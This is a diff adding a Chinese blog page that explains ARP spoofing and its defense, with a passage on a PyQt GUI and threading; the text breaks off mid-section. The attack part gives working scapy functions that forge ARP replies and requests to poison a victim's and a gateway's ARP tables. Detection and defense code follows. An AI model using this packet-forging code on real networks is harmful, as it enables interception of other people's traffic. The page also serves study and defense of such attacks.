@@ -1,0 +1,530 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="一、原理                           1.攻击                           (1)欺骗受害者       向受害者发包，欺骗受害者本机为网关，使得受害者的ARP表中本机的MAC地址为网关的MAC地址。 12345678910111213def build_rep(target_ip, gateway_ip):">
+<meta property="og:type" content="article">
+<meta property="og:title" content="arp_spoof">
+<meta property="og:url" content="http://pig-007.github.io/2022/03/07/arp_spoof/index.html">
+<meta property="og:site_name" content="PIG-007">
+<meta property="og:description" content="一、原理                           1.攻击                           (1)欺骗受害者       向受害者发包，欺骗受害者本机为网关，使得受害者的ARP表中本机的MAC地址为网关的MAC地址。 12345678910111213def build_rep(target_ip, gateway_ip):">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071205089.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071121488.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071125687.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071121263.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071127006.png">
+<meta property="article:published_time" content="2022-03-07T04:20:33.000Z">
+<meta property="article:modified_time" content="2022-03-07T04:27:50.944Z">
+<meta property="article:author" content="PIG-007">
+<meta property="article:tag" content="arp_spoof">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071205089.png"><title>arp_spoof | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2022/03/07/arp_spoof/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">arp_spoof</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-03-07</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-07</span></span></div></header><div class="post-body">
+        <h1 id="一、原理"   >
+          <a href="#一、原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、原理" class="headerlink" title="一、原理"></a>一、原理</h1>
+      
+        <h2 id="1-攻击"   >
+          <a href="#1-攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-攻击" class="headerlink" title="1.攻击"></a>1.攻击</h2>
+      
+        <h3 id="1-欺骗受害者"   >
+          <a href="#1-欺骗受害者" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-欺骗受害者" class="headerlink" title="(1)欺骗受害者"></a>(1)欺骗受害者</h3>
+      <p>向受害者发包，欺骗受害者本机为网关，使得受害者的ARP表中本机的MAC地址为网关的MAC地址。</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rep</span>(<span class="params">target_ip, gateway_ip</span>):</span></span><br><span class="line">    <span class="keyword">global</span> self_mac</span><br><span class="line">    target_mac = getmacbyip(target_ip)</span><br><span class="line">    <span class="comment">#print(gateway_ip)</span></span><br><span class="line">    <span class="keyword">if</span> target_ip <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error: Could not resolve targets MAC address&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># Ether对应包的src和dst   ARP只会修改其中的ARP包，告诉dst，这个包的mac是hwsrc，ip是psrc，发给hwdst/pdst</span></span><br><span class="line">    pkt = Ether(src=self_mac, dst=target_mac) / ARP(hwsrc=self_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip,</span><br><span class="line">                                                    op=<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 本机mac 受欺骗的主机mac 本机mac 网关的ip地址 被攻击人的mac 被攻击人的ip OP值是表示请求还是回应 1：请求  2：回应</span></span><br><span class="line">        <span class="comment"># 那么这种模式下即本机发往受害者，告诉受害者网关(psrc)的mac地址是本机(self_mac)，下回依据IP查ARP表就会把应该发给网关的包通过mac发包发给本机</span></span><br><span class="line">    <span class="keyword">return</span> pkt</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="2-欺骗网关"   >
+          <a href="#2-欺骗网关" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-欺骗网关" class="headerlink" title="(2)欺骗网关"></a>(2)欺骗网关</h3>
+      <p>向网关发包，欺骗网关受害者为本机，使得网关的ARP表中受害者的MAC地址为本机的MAC地址</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_req</span>(<span class="params">target_ip, gateway_ip</span>):</span></span><br><span class="line">    <span class="keyword">global</span> self_mac</span><br><span class="line">    target_mac = getmacbyip(target_ip)</span><br><span class="line">    gateway_mac = getmacbyip(gateway_ip)</span><br><span class="line">    <span class="keyword">if</span> target_mac <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error: Could not resolve targets MAC address&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Ether对应包的src和dst   ARP只会修改其中的ARP包，告诉dst，这个包的mac是hwsrc，ip是psrc，发给hwdst/pdst</span></span><br><span class="line">    pkt = Ether(src=self_mac, dst=gateway_mac) / ARP(hwsrc=self_mac, psrc=target_ip, hwdst=gateway_mac, pdst = gateway_ip,</span><br><span class="line">                                                  op=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 本机mac 网关mac 本机mac 受欺骗的主机mac 网关mac 网关的ip地址 OP值是表示请求还是回应 1：请求  2：回应</span></span><br><span class="line">    <span class="comment"># 那么这种模式下即本机发往网关，告诉网关受害者(psrc)的mac地址是本机(self_mac)，下回依据IP查ARP表就会把应该发给受害者的包通过mac发包发给本机</span></span><br><span class="line">    <span class="keyword">return</span> pkt</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="3-欺骗所有人"   >
+          <a href="#3-欺骗所有人" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-欺骗所有人" class="headerlink" title="(3)欺骗所有人"></a>(3)欺骗所有人</h3>
+      <p>向广播地址发包，使得所有人的ARP都被修改，从而欺骗所有人，这个没有实现，感觉动静太大，没啥用</p>
+
+        <h2 id="2-防御"   >
+          <a href="#2-防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-防御" class="headerlink" title="2.防御"></a>2.防御</h2>
+      
+        <h3 id="1-检测"   >
+          <a href="#1-检测" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-检测" class="headerlink" title="(1)检测"></a>(1)检测</h3>
+      
+        <h4 id="①rep模式"   >
+          <a href="#①rep模式" class="heading-link"><i class="fas fa-link"></i></a><a href="#①rep模式" class="headerlink" title="①rep模式"></a>①rep模式</h4>
+      <p>这种模式本机的arp表中的MAC地址会改变，linux下由于输入arp加载比较慢，估计后台会进行ping，所以使用<code>ip neigh</code>来获取，从中找到是否存在相同的MAC地址，从而判断是否被该模式攻击，即转化为set看长度是否相同</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#detect_rep</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(ip_mac_dictionary) != <span class="built_in">len</span>(<span class="built_in">set</span>(ip_mac_dictionary.values()))):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rep_get&quot;</span>)</span><br><span class="line">    rep_detect_flag = <span class="literal">True</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="②req模式"   >
+          <a href="#②req模式" class="heading-link"><i class="fas fa-link"></i></a><a href="#②req模式" class="headerlink" title="②req模式"></a>②req模式</h4>
+      <p>这种模式下我们可以尝试arping网关，如果MAC地址没被修改，而arping网关不能通，那么就是网关被欺骗，依据此来进行检测</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#detect_req</span></span><br><span class="line">gateway_mac = getmacbyip(gateway_ip)</span><br><span class="line">p = subprocess.Popen([<span class="string">&quot;arping&quot;</span>,<span class="string">&quot;-i&quot;</span>,netD_name,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;1&quot;</span>,gateway_mac], stdout=subprocess.PIPE)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> p.stdout.readlines():</span><br><span class="line">    line_splitby_space = line.decode(<span class="string">&quot;utf-8&quot;</span>).strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;Timeout&quot;</span> <span class="keyword">in</span> line_splitby_space):</span><br><span class="line">        req_detect_flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="2-实际防御"   >
+          <a href="#2-实际防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-实际防御" class="headerlink" title="(2)实际防御"></a>(2)实际防御</h3>
+      
+        <h4 id="①rep模式-1"   >
+          <a href="#①rep模式-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#①rep模式-1" class="headerlink" title="①rep模式"></a>①rep模式</h4>
+      <p>直接将网关真实的MAC地址和对应IP进行静态绑定即可。获取网关真实MAC地址，可以使用getmacbyip函数，该函数会向局域网内广播，询问网关真实的MAC的地址，而攻击者那里肯定存在真实的MAC地址，所以基本一定能获得到真实的IP地址</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071205089.png" alt="image-20220307120520964"></p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(rep_detect_flag):</span><br><span class="line">    self.ui.defenseInfoText.appendPlainText(<span class="string">&quot;Defending against arp_rep attacks......&quot;</span>)</span><br><span class="line">    build_rep_defense()</span><br><span class="line">    p = subprocess.Popen([<span class="string">&quot;ip&quot;</span>, <span class="string">&quot;neigh&quot;</span>], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> p.stdout.readlines():</span><br><span class="line">        line_splitby_space = line.decode(<span class="string">&quot;utf-8&quot;</span>).strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;FAILED&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> line_splitby_space):</span><br><span class="line">            self.ui.defenseInfoText.appendPlainText(<span class="string">&#x27;&#123;:&lt;30s&#125;&#x27;</span>.<span class="built_in">format</span>(line_splitby_space[<span class="number">0</span>]) + <span class="string">&quot;\t&quot;</span> + line_splitby_space[<span class="number">4</span>])</span><br></pre></td></tr></table></div></figure>
+
+<p>这里我直接修改所有的的IP_MAC为静态的</p>
+
+        <h4 id="②req模式-1"   >
+          <a href="#②req模式-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#②req模式-1" class="headerlink" title="②req模式"></a>②req模式</h4>
+      <p>由于是网关被欺骗了，所以我们也可以向网关发包，使其将我的IP和MAC真实写入ARP欺骗，但是攻击者可能会一直发包，所以我们也需要一直发包才能断续防御攻击，不过还是可能会丢不少包。</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_req_defense</span>():</span></span><br><span class="line">    <span class="keyword">global</span> gateway_ip</span><br><span class="line">    <span class="keyword">global</span> self_mac</span><br><span class="line">    self_ip = get_self_ip()</span><br><span class="line">    <span class="comment">#self_mac = get_if_hwaddr(netD_name)</span></span><br><span class="line">    gateway_mac = getmacbyip(gateway_ip)</span><br><span class="line">    <span class="comment">#Ether对应包的src和dst   ARP只会修改其中的ARP包，告诉dst，这个包的mac是hwsrc，ip是psrc，发给hwdst/pdst</span></span><br><span class="line">    pkt = Ether(src=self_mac, dst=gateway_mac) / ARP(hwsrc=self_mac, psrc=self_ip, hwdst=gateway_mac, pdst = gateway_ip,op=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> pkt</span><br></pre></td></tr></table></div></figure>
+
+<p>如上设置包内容，告诉网关我才是真的。</p>
+<p>或者有网关权限的，直接在网关的shell进行静态绑定。</p>
+
+        <h1 id="二、pyQt界面"   >
+          <a href="#二、pyQt界面" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、pyQt界面" class="headerlink" title="二、pyQt界面"></a>二、pyQt界面</h1>
+      
+        <h2 id="1-环境搭建"   >
+          <a href="#1-环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h2>
+      <p>主要配合pycharm，先安装pyQt5，然后在对应的包里即可打开</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install PyQt5</span><br><span class="line">/home/hacker/.<span class="built_in">local</span>/lib/python3.6/site-packages/qt5_applications/Qt/bin/designer</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="2-配合pycharm"   >
+          <a href="#2-配合pycharm" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-配合pycharm" class="headerlink" title="2.配合pycharm"></a>2.配合pycharm</h2>
+      <p>主要设置一下即可</p>
+<p>File-&gt;setting-&gt;Tools-&gt;External Tools-&gt;+一下工具</p>
+
+        <h3 id="Qt-Designer"   >
+          <a href="#Qt-Designer" class="heading-link"><i class="fas fa-link"></i></a><a href="#Qt-Designer" class="headerlink" title="Qt_Designer"></a>Qt_Designer</h3>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071121488.png" alt="image-20220307112101403"></p>
+<p>直接点击即可加载</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071125687.png" alt="image-20220307112540614"></p>
+
+        <h3 id="UI转py"   >
+          <a href="#UI转py" class="heading-link"><i class="fas fa-link"></i></a><a href="#UI转py" class="headerlink" title="UI转py"></a>UI转py</h3>
+      <p>转完之后会比较舒服，因为在pycharm中可以提示相关的控件，但是直接load加载ui文件的话就没有提示。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071121263.png" alt="image-20220307112150183"></p>
+<p>Arguments的命令参数为：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-m PyQt5.uic.pyuic $FileName$ -o $FileNameWithoutExtension$.py</span><br></pre></td></tr></table></div></figure>
+
+<p>目前好像py-&gt;ui没办法转回去</p>
+<p>之后点击要转换的ui文件，然后对应的打开工具即可在当前文件夹下生成py文件</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071127006.png" alt="image-20220307112701929"></p>
+<p>对应就会生成<code>window.py</code>文件</p>
+
+        <h2 id="3-界面启动"   >
+          <a href="#3-界面启动" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-界面启动" class="headerlink" title="3.界面启动"></a>3.界面启动</h2>
+      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainWindow</span>(<span class="params">QMainWindow</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="comment">#导入ui</span></span><br><span class="line">        self.ui = Ui_MainWindow()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication([])</span><br><span class="line">    myWindow = MainWindow()</span><br><span class="line">    myWindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="4-界面退出"   >
+          <a href="#4-界面退出" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-界面退出" class="headerlink" title="4.界面退出"></a>4.界面退出</h2>
+      <p>一般界面都是多线程的，所以退出的时候一般需要加上一些东西将一些线程给关闭，安全退出，所以需要重写一下窗口关闭的closeEvent函数</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">closeEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> threads_flag_dictionary.keys():</span><br><span class="line">        threads_flag_dictionary[key].<span class="built_in">set</span>()<span class="comment">#相关线程终止flag设置</span></span><br><span class="line">    event.accept()</span><br><span class="line">    os._exit(<span class="number">0</span>)</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h1 id="三、利用函数详解"   >
+          <a href="#三、利用函数详解" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、利用函数详解" class="headerlink" title="三、利用函数详解"></a>三、利用函数详解</h1>
+      
+        <h2 id="1-发包函数"   >
+          <a href="#1-发包函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-发包函数" class="headerlink" title="1.发包函数"></a>1.发包函数</h2>
+      
+        <h3 id="1-Ether"   >
+          <a href="#1-Ether" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Ether" class="headerlink" title="(1)Ether"></a>(1)Ether</h3>
+      <p>主要就是使用Ether创建一个MAC数据帧头，即源MAC地址，要发往的MAC地址，这个不能更改，用来在局域网中设置发往的地方。</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ether(src=self_mac, dst=gateway_mac)</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="2-ARP"   >
+          <a href="#2-ARP" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ARP" class="headerlink" title="(2)ARP"></a>(2)ARP</h3>
+      <p>这个就是用来伪造数据包中的ARP数据，可以随便改，目标主机接收到该数据包的时候，会判断是否和本机的ARP表是否相同，不同则会依据该ARP包来进行修改。</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ARP(hwsrc=self_mac, psrc=target_ip, hwdst=gateway_mac, pdst = gateway_ip,op=<span class="number">1</span>)</span><br></pre></td></tr></table></div></figure>
+
+<p>ARP欺骗主要就是修改<code>hwsrc/psrc</code>，使得目标主机的ARP表依据该<code>hwsrc/psrc</code>来对自己的ARP表进行写入。比如这里就是使得目标主机中的ARP表由原本正确的<code>target_ip---target_MAC</code>变为<code>target_ip---self_mac</code></p>
+
+        <h3 id="3-实际发包"   >
+          <a href="#3-实际发包" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-实际发包" class="headerlink" title="(3)实际发包"></a>(3)实际发包</h3>
+      <p>需要将Ether和ARP结合起来组成一个MAC帧pkt，然后就可以将该MAC帧发往网卡<code>network driver</code></p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkt = Ether(src=self_mac, dst=gateway_mac) / ARP(hwsrc=self_mac, psrc=target_ip, hwdst=gateway_mac, pdst = gateway_ip,op=<span class="number">1</span>)</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="①send"   >
+          <a href="#①send" class="heading-link"><i class="fas fa-link"></i></a><a href="#①send" class="headerlink" title="①send"></a>①send</h4>
+      <p>工作在第三层网络层，发送IP数据包，包头需要是IP数据包头</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send(IP(dst=<span class="string">&quot;192.168.1.107&quot;</span>)/ICMP())</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="②sendp"   >
+          <a href="#②sendp" class="heading-link"><i class="fas fa-link"></i></a><a href="#②sendp" class="headerlink" title="②sendp"></a>②sendp</h4>
+      <p>工作在第二层链路层，发送MAC帧，包头需要是MAC帧头，即Ether</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sendp(pkt, inter=<span class="number">2</span>, iface=netD_name)</span><br><span class="line"><span class="comment">#这里pkt就是包，即Ether()/ARP()之类的</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="2-线程函数"   >
+          <a href="#2-线程函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-线程函数" class="headerlink" title="2.线程函数"></a>2.线程函数</h2>
+      <p>使用pyQt线程函数，一般两种方法，比较喜欢用threading的</p>
+
+        <h3 id="1-线程启动"   >
+          <a href="#1-线程启动" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-线程启动" class="headerlink" title="(1)线程启动"></a>(1)线程启动</h3>
+      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置终止信号，防止线程一直运行不停止</span></span><br><span class="line">send_thread_defense_stop_flag = threading.Event()</span><br><span class="line"><span class="comment">#线程创建，对应self.send_pack函数，参数为args=(xxx,xxx,xxx)</span></span><br><span class="line">send_thread = threading.Thread(target=self.send_pack, args=(pkt,send_thread_defense_stop_flag,<span class="string">&quot;defense&quot;</span>))</span><br><span class="line"><span class="comment">#线程启动</span></span><br><span class="line">send_thread.start()</span><br><span class="line"><span class="comment">#将终止信号添加进字典进行管理</span></span><br><span class="line">threads_flag_dictionary[<span class="string">&#x27;send_defense_thread&#x27;</span>] = send_thread_defense_stop_flag</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="2-线程阻塞"   >
+          <a href="#2-线程阻塞" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-线程阻塞" class="headerlink" title="(2)线程阻塞"></a>(2)线程阻塞</h3>
+      <p>有时候需要线程阻塞，即完成该线程才进行下一步，那么就需要用到join函数</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用在send_thread.start()之后</span></span><br><span class="line">send_thread.join()</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="3-线程终止"   >
+          <a href="#3-线程终止" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-线程终止" class="headerlink" title="(3)线程终止"></a>(3)线程终止</h3>
+      <p>即之前提到的设置对应的终止flag</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#触发停止信号</span></span><br><span class="line">threads_flag_dictionary[<span class="string">&#x27;send_defense_thread&#x27;</span>].<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">#send_pack函数中某些需要一直运行的代码块中</span></span><br><span class="line"><span class="keyword">while</span> (stop_flag.is_set()):</span><br><span class="line">	<span class="keyword">pass</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="3-其他功能性函数"   >
+          <a href="#3-其他功能性函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-其他功能性函数" class="headerlink" title="3.其他功能性函数"></a>3.其他功能性函数</h2>
+      
+        <h3 id="1-获取存活主机函数"   >
+          <a href="#1-获取存活主机函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-获取存活主机函数" class="headerlink" title="(1)获取存活主机函数"></a>(1)获取存活主机函数</h3>
+      <p>由于<code>ip neigh</code>命令会从一个存活主机的缓冲区中获取相关的主机，但是实际上如果新加入一个主机，则不会显示出来，除非接收到该主机的包，所以我们需要主动去ping他们，看他们是否存活。</p>
